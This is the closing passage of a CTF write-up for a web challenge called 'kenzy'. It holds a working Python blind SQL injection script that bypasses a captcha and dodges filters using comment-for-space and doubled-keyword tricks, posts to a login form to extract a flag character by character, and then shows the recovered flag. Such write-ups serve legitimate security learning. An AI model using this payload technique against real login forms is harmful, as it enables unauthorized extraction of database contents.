</span></span><span class="line"><span class="cl">		<span class="n">captcha</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">captcha_decode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">captcha</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="c1">#print(captcha_decode)</span>
</span></span><span class="line"><span class="cl">		<span class="n">url2</span> <span class="o">=</span> <span class="s1">&#39;http://34.175.249.72:60001/index.php&#39;</span>
</span></span><span class="line"><span class="cl">		<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;admin&#39; AND </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">=ascii(substr((select flag from solve limit 1),</span><span class="si">{</span><span class="n">counter</span><span class="si">}</span><span class="s2">,1))#&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;/**/&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;AND&#39;</span><span class="p">,</span><span class="s1">&#39;ANANDD&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	    <span class="s1">&#39;username&#39;</span> <span class="p">:</span><span class="n">payload</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span>  <span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="s1">&#39;captcha&#39;</span> <span class="p">:</span> <span class="n">captcha_decode</span> <span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="s1">&#39;send&#39;</span> <span class="p">:</span><span class="s1">&#39;Send&#39;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="n">r2</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url2</span> <span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="c1">#print(r2.text)</span>
</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">flag</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="s2">&#34;Treasures&#34;</span> <span class="ow">in</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="n">flag</span> <span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">break</span>
</span></span><span class="line"><span class="cl">	<span class="n">counter</span> <span class="o">+=</span><span class="mi">1</span></span></span></code></pre></div></div>
<p>Running the script now</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/kenzy/20220806025633.png"
        data-srcset="/assets/images/kenzy/20220806025633.png, /assets/images/kenzy/20220806025633.png 1.5x, /assets/images/kenzy/20220806025633.png 2x"
        data-sizes="auto"
        alt="/assets/images/kenzy/20220806025633.png"
        title="error" /></p>
<p>and after some time we will get our flag eventually which is</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-cmd">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">ASCWG{23fsdc$@#EAScasq12_hard}</span></span></code></pre></div></div>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://c.tenor.com/n-NpYkvi3y4AAAAC/%D8%A8%D9%87%D8%AC%D8%AA%D8%B5%D8%A7%D8%A8%D8%B1-bahgat-saber.gif"
        data-srcset="https://c.tenor.com/n-NpYkvi3y4AAAAC/%D8%A8%D9%87%D8%AC%D8%AA%D8%B5%D8%A7%D8%A8%D8%B1-bahgat-saber.gif, https://c.tenor.com/n-NpYkvi3y4AAAAC/%D8%A8%D9%87%D8%AC%D8%AA%D8%B5%D8%A7%D8%A8%D8%B1-bahgat-saber.gif 1.5x, https://c.tenor.com/n-NpYkvi3y4AAAAC/%D8%A8%D9%87%D8%AC%D8%AA%D8%B5%D8%A7%D8%A8%D8%B1-bahgat-saber.gif 2x"
        data-sizes="auto"
        alt="https://c.tenor.com/n-NpYkvi3y4AAAAC/%D8%A8%D9%87%D8%AC%D8%AA%D8%B5%D8%A7%D8%A8%D8%B1-bahgat-saber.gif"
        title="error" /></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2022-08-06</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://example.org/posts/web-exploitation/2022-08-06-kenzy/" data-title="kenzy challenge Writeup" data-via="tinkerhell1337" data-hashtags="CTF,sql-injection"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/web-exploitation/2022-08-06-kenzy/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://example.org/posts/web-exploitation/2022-08-06-kenzy/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2fexample.org%2fposts%2fweb-exploitation%2f2022-08-06-kenzy%2f&amp;text=kenzy%20challenge%20Writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/sql-injection/">Sql-Injection</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/web-exploitation/2022-07-25-flused-emoji/" class="prev" rel="prev" title="Flushed Emoji challenge Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Flushed Emoji challenge Writeup</a>
            <a href="/posts/windows-machines/2022-08-20-timelapse/" class="next" rel="next" title="Timelapse Hackthebox writeup">Timelapse Hackthebox writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.150.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a>
        </div>

        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
</html>
